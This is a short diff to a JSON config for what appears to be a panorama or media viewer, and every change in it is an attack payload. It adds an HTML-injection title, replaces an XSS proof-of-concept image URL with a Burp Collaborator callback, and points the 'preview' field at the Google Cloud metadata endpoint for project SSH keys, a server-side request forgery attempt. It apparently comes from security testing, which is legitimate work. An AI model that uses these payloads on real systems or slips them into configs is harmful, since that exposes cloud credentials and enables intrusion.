@@ -1,10 +1,10 @@
 {
   "audio": "",
   "title": "<h1>Hello</h1>",
-  "image": "https://brutelogic.com.br/poc.svg", 
+  "image": "https://f0gjqe0fke2oxglexmia6p2gw72yqn.burpcollaborator.net", 
   "isStereo": true,
   "isYawOnly": false,
-  "preview": "",
+  "preview": "https://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json",
   "video": "",
   "pitch": 0,
   "yaw": 1.6,
